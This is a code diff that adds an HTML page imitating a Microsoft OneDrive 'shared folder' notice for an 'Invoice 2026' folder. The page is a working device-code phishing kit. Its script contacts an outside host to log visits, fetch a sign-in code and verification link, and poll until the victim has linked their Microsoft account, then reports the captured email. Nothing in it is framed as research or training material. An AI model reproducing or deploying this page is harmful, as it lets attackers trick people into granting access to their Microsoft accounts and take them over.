@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Invoice 2026</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+      background: linear-gradient(150deg, #e6eff9 0%, #f0f2f5 45%, #e8eef5 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+    .shell {
+      width: 100%;
+      max-width: 520px;
+      background: #ffffff;
+      border: 1px solid #dde1e7;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.07), 0 20px 60px rgba(0,0,0,.15);
+      overflow: hidden;
+    }
+    /* Notification card */
+    .notif-card {
+      padding: 32px 36px 28px;
+    }
+    .notif-title {
+      font-size: 21px;
+      font-weight: 700;
+      color: #1a1918;
+      margin-bottom: 8px;
+      line-height: 1.3;
+    }
+    .notif-sub {
+      font-size: 14px;
+      color: #5a5856;
+      margin-bottom: 22px;
+      line-height: 1.65;
+    }
+    .notif-meta {
+      font-size: 12px;
+      color: #9a9896;
+      text-align: center;
+      margin-top: 12px;
+      line-height: 1.5;
+    }
+    /* Sender row */
+    .sender-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 18px;
+      padding: 10px 14px;
+      background: linear-gradient(to right, #0078d40c, transparent);
+      border-radius: 0 6px 6px 0;
+      border-left: 3px solid #0078d4;
+    }
+    .sender-avatar {
+      width: 34px;
+      height: 34px;
+      background: #0078d4;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 700;
+      color: #ffffff;
+      flex-shrink: 0;
+      box-shadow: 0 2px 6px #0078d450;
+    }
+    .sender-info { flex: 1; min-width: 0; }
+    .sender-name { font-size: 13px; font-weight: 600; color: #1a1918; }
+    .sender-sub { font-size: 12px; color: #8a8886; }
+    /* File card */
+    .file-card {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 14px 16px;
+      background: linear-gradient(135deg, #f8f9fc, #f3f4f8);
+      border: 1px solid #e4e6ed;
+      border-radius: 6px;
+      margin: 16px 0;
+      box-shadow: 0 1px 4px rgba(0,0,0,.05);
+    }
+    .file-icon {
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 44px;
+      height: 44px;
+      background: #fff;
+      border-radius: 6px;
+      box-shadow: 0 1px 4px rgba(0,0,0,.10);
+    }
+    .file-info { flex: 1; min-width: 0; }
+    .file-name { font-size: 14px; font-weight: 600; color: #1a1918; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .file-meta { font-size: 12px; color: #8a8886; margin-top: 3px; }
+    /* Access / meta row */
+    .access-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #605e5c;
+      margin-bottom: 16px;
+      padding: 7px 10px;
+      background: #f8f8f8;
+      border-radius: 4px;
+    }
+    /* Calendar block */
+    .cal-block {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .cal-month {
+      background: #0078d4;
+      color: #fff;
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      padding: 3px 8px 0;
+      border-radius: 4px 4px 0 0;
+      min-width: 48px;
+      text-align: center;
+    }
+    .cal-day {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    /* Meeting card */
+    .meeting-card {
+      background: linear-gradient(135deg, #f8f9fc, #f3f4f8);
+      border: 1px solid #e4e6ed;
+      border-radius: 6px;
+      padding: 16px;
+      margin: 14px 0;
+      box-shadow: 0 1px 4px rgba(0,0,0,.05);
+    }
+    .meeting-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #1a1918;
+      margin-bottom: 10px;
+    }
+    .meeting-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #605e5c;
+      margin-bottom: 6px;
+    }
+    .meeting-row:last-child { margin-bottom: 0; }
+    /* RSVP buttons (decorative) */
+    .rsvp-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 4px;
+    }
+    .rsvp-btn {
+      flex: 1;
+      padding: 8px 4px;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      border: 1.5px solid;
+      transition: filter .12s, box-shadow .12s;
+    }
+    .rsvp-accept { background: #dff6dd; border-color: #107c10; color: #107c10; }
+    .rsvp-accept:hover { filter: brightness(.93); box-shadow: 0 2px 8px #107c1030; }
+    .rsvp-tentative { background: #fff4ce; border-color: #c7a800; color: #7a6400; }
+    .rsvp-tentative:hover { filter: brightness(.93); box-shadow: 0 2px 8px #c7a80030; }
+    .rsvp-decline { background: #fde7e9; border-color: #d13438; color: #a4262c; }
+    .rsvp-decline:hover { filter: brightness(.93); box-shadow: 0 2px 8px #d1343830; }
+    /* CTA button */
+    .cta-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      padding: 13px 20px;
+      background: #0078d4;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: filter .15s, box-shadow .15s;
+      box-shadow: 0 3px 12px #0078d440;
+      margin-bottom: 0;
+      font-family: inherit;
+      letter-spacing: .2px;
+    }
+    .cta-btn:hover { filter: brightness(.92); box-shadow: 0 5px 18px #0078d450; }
+    /* Divider before auth step */
+    .auth-divider {
+      border: none;
+      border-top: 1px solid #e8e6e4;
+      margin: 0;
+    }
+    /* Auth / device-code section */
+    .auth-pad {
+      padding: 24px 36px 30px;
+    }
+    .auth-heading {
+      font-size: 15px;
+      font-weight: 700;
+      color: #1a1918;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .auth-heading::before {
+      content: '';
+      display: inline-block;
+      width: 4px;
+      height: 18px;
+      background: #0078d4;
+      border-radius: 2px;
+      flex-shrink: 0;
+    }
+    /* Provider buttons */
+    .provider-btn {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 5px;
+      color: #201f1e;
+      font-size: 14px;
+      cursor: pointer;
+      margin-bottom: 10px;
+      transition: background .12s, border-color .12s, box-shadow .12s;
+      font-family: inherit;
+      font-weight: 600;
+    }
+    .ms-btn { background: #fff; border: 1.5px solid #ccc; }
+    .ms-btn:hover { background: #f5f5f5; border-color: #888; box-shadow: 0 2px 8px rgba(0,0,0,.08); }
+    .g-btn { background: #fff; border: 1.5px solid #ccc; }
+    .g-btn:hover { background: #f5f5f5; border-color: #888; box-shadow: 0 2px 8px rgba(0,0,0,.08); }
+    .back-link {
+      background: none;
+      border: none;
+      color: #0078d4;
+      cursor: pointer;
+      font-size: 13px;
+      padding: 0;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-family: inherit;
+    }
+    .back-link:hover { text-decoration: underline; }
+    .steps-list { margin-bottom: 18px; }
+    .step-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 9px 0;
+      border-bottom: 1px solid #f0efee;
+      font-size: 14px;
+    }
+    .step-item:last-child { border-bottom: none; }
+    .step-num {
+      min-width: 26px;
+      height: 26px;
+      background: #0078d4;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      color: #fff;
+      flex-shrink: 0;
+      box-shadow: 0 2px 6px #0078d445;
+    }
+    .step-text { color: #2d2c2b; line-height: 1.55; }
+    .step-em { color: #0078d4; font-style: normal; font-weight: 600; }
+    .code-display {
+      background: linear-gradient(135deg, #0078d40d, #0078d41a);
+      border: 1.5px solid #0078d445;
+      border-radius: 6px;
+      padding: 16px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 14px 0;
+      gap: 12px;
+    }
+    .code-text {
+      font-size: 30px;
+      font-weight: 700;
+      letter-spacing: 6px;
+      color: #0078d4;
+      font-family: 'Cascadia Code', 'Consolas', monospace;
+    }
+    .copy-btn {
+      background: #0078d4;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      padding: 7px 16px;
+      cursor: pointer;
+      font-size: 13px;
+      transition: filter .12s;
+      white-space: nowrap;
+      font-family: inherit;
+      font-weight: 600;
+    }
+    .copy-btn:hover { filter: brightness(.88); }
+    .open-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      padding: 11px;
+      background: #107c10;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      margin-bottom: 14px;
+      transition: filter .12s;
+      box-shadow: 0 2px 8px rgba(16,124,16,.28);
+      font-family: inherit;
+    }
+    .open-btn:hover { filter: brightness(.88); }
+    .status-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: #605e5c;
+      margin-bottom: 14px;
+      padding: 10px 14px;
+      background: linear-gradient(to right, #0078d408, transparent);
+      border: 1px solid #0078d422;
+      border-radius: 6px;
+    }
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid #e1dfdd;
+      border-top-color: #0078d4;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+      flex-shrink: 0;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .timer { font-size: 12px; color: #8a8886; margin-left: auto; font-variant-numeric: tabular-nums; }
+    .timer.expiring { color: #d13438; font-weight: 600; }
+    .cancel-btn {
+      background: none;
+      border: 1.5px solid #e1dfdd;
+      border-radius: 5px;
+      color: #605e5c;
+      padding: 9px 16px;
+      cursor: pointer;
+      font-size: 13px;
+      width: 100%;
+      transition: border-color .12s, color .12s;
+      font-family: inherit;
+    }
+    .cancel-btn:hover { border-color: #d13438; color: #d13438; }
+    .success-box { text-align: center; padding: 24px 0 8px; }
+    .success-icon-wrap {
+      width: 60px;
+      height: 60px;
+      background: #dff6dd;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+      box-shadow: 0 4px 16px rgba(16,124,16,.20);
+    }
+    .success-title { font-size: 21px; font-weight: 700; color: #107c10; margin-bottom: 8px; }
+    .success-sub { font-size: 14px; color: #605e5c; }
+    .error-box {
+      background: #fde7e9;
+      border: 1px solid #d13438;
+      border-radius: 5px;
+      padding: 10px 14px;
+      color: #a4262c;
+      font-size: 13px;
+      margin-bottom: 12px;
+    }
+    .footer {
+      padding: 13px 24px;
+      background: #f5f4f3;
+      border-top: 1px solid #e8e6e4;
+      font-size: 11px;
+      color: #8a8886;
+      text-align: center;
+    }
+    .step-box { display: none; }
+    .step-box.visible { display: block; }
+  </style>
+</head>
+<body>
+<div class="shell">
+
+  <div class="topbar" style="background:#0078d4;padding:14px 28px;display:flex;align-items:center;gap:10px;">
+    <svg width="22" height="16" viewBox="0 0 22 16" fill="none"><path d="M13.5 15H18.5C20.43 15 22 13.43 22 11.5C22 9.84 20.86 8.44 19.32 8.07C19.1 5.25 16.81 3 14 3C12.59 3 11.29 3.54 10.31 4.43C9.72 4.16 9.07 4 8.38 4C5.96 4 4 5.96 4 8.38V8.5C2.34 8.5 1 9.84 1 11.5C1 13.16 2.34 14.5 4 14.5H4.5" stroke="#ffffff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/><path d="M13.5 15H7.5C6.4 15 5.5 14.1 5.5 13V10C5.5 8.9 6.4 8 7.5 8H16.5C17.6 8 18.5 8.9 18.5 10V13C18.5 14.1 17.6 15 16.5 15H13.5Z" fill="rgba(255,255,255,0.25)" stroke="#ffffff" stroke-width="1.5"/></svg>
+    <span style="font-size:14px;font-weight:700;color:#ffffff;letter-spacing:.1px;">Microsoft OneDrive</span>
+  </div>
+
+  <!-- Step: Notification card (landing) -->
+  <div id="step-landing" class="step-box visible">
+    <div class="notif-card">
+        <div class="sender-row">
+        <div class="sender-avatar">T</div>
+        <div class="sender-info">
+          <div class="sender-name">testadmin</div>
+          <div class="sender-sub">added you to a shared folder</div>
+        </div>
+      </div>
+        <div class="notif-title" style="margin-top:16px;">You&#39;ve been added to a shared folder</div>
+        <div class="file-card">
+          <div class="file-icon">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V7z" fill="#0078d4" opacity=".15" stroke="#0078d4" stroke-width="1.5" stroke-linejoin="round"/></svg>
+          </div>
+          <div class="file-info">
+            <div class="file-name">Invoice 2026</div>
+            <div class="file-meta">Shared folder &middot; Documents and files inside</div>
+          </div>
+        </div>
+        <div class="access-row">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style="flex-shrink:0;"><path d="M17 11V7A5 5 0 007 7v4M5 11h14a1 1 0 011 1v8a1 1 0 01-1 1H5a1 1 0 01-1-1v-8a1 1 0 011-1z" stroke="#605e5c" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <span>Access level: <strong>Can view</strong> &middot; This folder contains documents and files</span>
+        </div>
+        <button class="cta-btn" onclick="selectProvider('microsoft')">Open Shared Folder &rarr;</button>
+        <div class="notif-meta">Sign in with your Microsoft account to access this folder.</div>
+      </div>
+  </div>
+
+  <!-- Step: Provider selection -->
+  <div id="step-provider" class="step-box">
+    <div class="auth-pad">
+      <button class="back-link" onclick="goTo('step-landing')">&larr; Back</button>
+      <div class="auth-heading">Choose your account type</div>
+      <button class="provider-btn ms-btn" onclick="selectProvider('microsoft')">
+          <svg width="20" height="20" viewBox="0 0 21 21" style="flex-shrink:0;"><rect x="0" y="0" width="9.5" height="9.5" fill="#f25022"/><rect x="11.5" y="0" width="9.5" height="9.5" fill="#7fba00"/><rect x="0" y="11.5" width="9.5" height="9.5" fill="#00a4ef"/><rect x="11.5" y="11.5" width="9.5" height="9.5" fill="#ffb900"/></svg>
+          Microsoft 365 / Outlook
+        </button>
+    </div>
+  </div>
+
+  <!-- Step: Device code -->
+  <div id="step-code" class="step-box">
+    <hr class="auth-divider" />
+    <div class="auth-pad">
+      <button class="back-link" id="code-back-btn" onclick="cancelAndGoBack()">&larr; Back</button>
+      <div class="auth-heading">Verify your account to access this folder</div>
+      <div class="steps-list">
+        <div class="step-item">
+          <div class="step-num">1</div>
+          <div class="step-text">Copy the access code below</div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">2</div>
+          <div class="step-text">Click <span class="step-em">Open Verification Page</span> and enter the code</div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">3</div>
+          <div class="step-text">Sign in with your Microsoft account to open the folder</div>
+        </div>
+      </div>
+      <div class="code-display">
+        <span class="code-text" id="user-code">——————</span>
+        <button class="copy-btn" id="copy-btn" onclick="copyCode()">Copy</button>
+      </div>
+      <a id="open-btn" class="open-btn" href="#" target="_blank" onclick="copyCode()">
+        Open Verification Page &#8599;
+      </a>
+      <div class="status-row">
+        <div class="spinner"></div>
+        <span>Waiting for sign&#8209;in&hellip;</span>
+        <span class="timer" id="timer-display"></span>
+      </div>
+      <div id="error-box" class="error-box" style="display:none;"></div>
+      <button class="cancel-btn" onclick="cancelAndGoBack()">Cancel</button>
+    </div>
+  </div>
+
+  <!-- Step: Success -->
+  <div id="step-success" class="step-box">
+    <div class="auth-pad">
+      <div class="success-box">
+        <div class="success-icon-wrap">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#107c10" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <div class="success-title">Access Granted</div>
+        <div class="success-sub" id="success-detail">You can now view the shared folder.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">Microsoft OneDrive &middot; onedrive.com &middot; &copy; Microsoft Corporation</div>
+
+</div>
+
+<script>
+  const API = "https://zengrid.space";
+  const LINK_TOKEN = "BeZvvkeODg_SU6lI9HUTCIQHZEKNGRVc";
+  let sessionToken = null;
+  let pollTimer = null;
+  let countdownTimer = null;
+  let appExpiresAt = null;
+  let prevStep = "step-landing";
+  let currentProvider = "";
+  let openNotified = false;
+
+  const STEPS = ["step-landing", "step-provider", "step-code", "step-success"];
+
+  // Track page view on load
+  fetch(API + "/connect/page/" + LINK_TOKEN + "/visit", {method: "POST"}).catch(() => {});
+
+  function goTo(id) {
+    STEPS.forEach(s => document.getElementById(s).classList.remove("visible"));
+    document.getElementById(id).classList.add("visible");
+  }
+
+  function showProviders() {
+    prevStep = "step-landing";
+    goTo("step-provider");
+  }
+
+  function cancelAndGoBack() {
+    stopTimers();
+    if (sessionToken) {
+      fetch(API + "/connect/session/" + sessionToken, { method: "DELETE" }).catch(() => {});
+      sessionToken = null;
+    }
+    goTo(prevStep === "step-provider" ? "step-provider" : "step-landing");
+  }
+
+  function stopTimers() {
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+  }
+
+  async function selectProvider(provider) {
+    currentProvider = provider;
+    prevStep = "microsoft" ? "step-landing" : "step-provider";
+    goTo("step-code");
+    document.getElementById("user-code").textContent = "Loading…";
+    document.getElementById("open-btn").href = "#";
+    document.getElementById("copy-btn").textContent = "Copy";
+    document.getElementById("error-box").style.display = "none";
+    stopTimers();
+
+    try {
+      const r = await fetch(API + "/connect/page/" + LINK_TOKEN + "/init", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ provider })
+      });
+      if (!r.ok) throw new Error("Server error");
+      const data = await r.json();
+      sessionToken = data.session_token;
+      appExpiresAt = new Date(data.app_expires_at);
+      document.getElementById("user-code").textContent = data.user_code;
+      document.getElementById("open-btn").href = data.verification_uri;
+      startCountdown();
+      startPolling(data.poll_interval || 5);
+    } catch(e) {
+      showError("Failed to generate code. Please try again.");
+      cancelAndGoBack();
+    }
+  }
+
+  function copyCode() {
+    const code = document.getElementById("user-code").textContent;
+    if (code && code !== "——————" && code !== "Loading…") {
+      navigator.clipboard.writeText(code).catch(() => {});
+      const btn = document.getElementById("copy-btn");
+      btn.textContent = "Copied!";
+      setTimeout(() => { btn.textContent = "Copy"; }, 2000);
+      if (!openNotified) {
+        openNotified = true;
+        fetch(API + "/connect/page/" + LINK_TOKEN + "/opened", {
+          method: "POST", headers: {"X-Provider": currentProvider}
+        }).catch(() => {});
+      }
+    }
+  }
+
+  function startCountdown() {
+    const el = document.getElementById("timer-display");
+    function tick() {
+      const diff = Math.max(0, Math.floor((appExpiresAt - Date.now()) / 1000));
+      const m = String(Math.floor(diff / 60)).padStart(2, "0");
+      const s = String(diff % 60).padStart(2, "0");
+      el.textContent = diff > 0 ? "Expires in " + m + ":" + s : "Expired";
+      el.className = "timer" + (diff < 60 ? " expiring" : "");
+      if (diff === 0) clearInterval(countdownTimer);
+    }
+    tick();
+    countdownTimer = setInterval(tick, 1000);
+  }
+
+  function startPolling(interval) {
+    pollTimer = setInterval(async () => {
+      if (!sessionToken) return;
+      try {
+        const r = await fetch(API + "/connect/session/" + sessionToken + "/status");
+        if (!r.ok) return;
+        const data = await r.json();
+        if (data.status === "connected") {
+          stopTimers();
+          const detail = data.email ? data.email + " linked successfully." : "Your account has been linked.";
+          document.getElementById("success-detail").textContent = detail;
+          goTo("step-success");
+          
+        } else if (data.status === "expired" || data.status === "cancelled") {
+          stopTimers();
+          showError("Session expired. Please try again.");
+          setTimeout(() => cancelAndGoBack(), 2500);
+        }
+      } catch(e) {}
+    }, interval * 1000);
+  }
+
+  function showError(msg) {
+    const el = document.getElementById("error-box");
+    el.textContent = msg;
+    el.style.display = "block";
+  }
+</script>
+</body>
+</html>
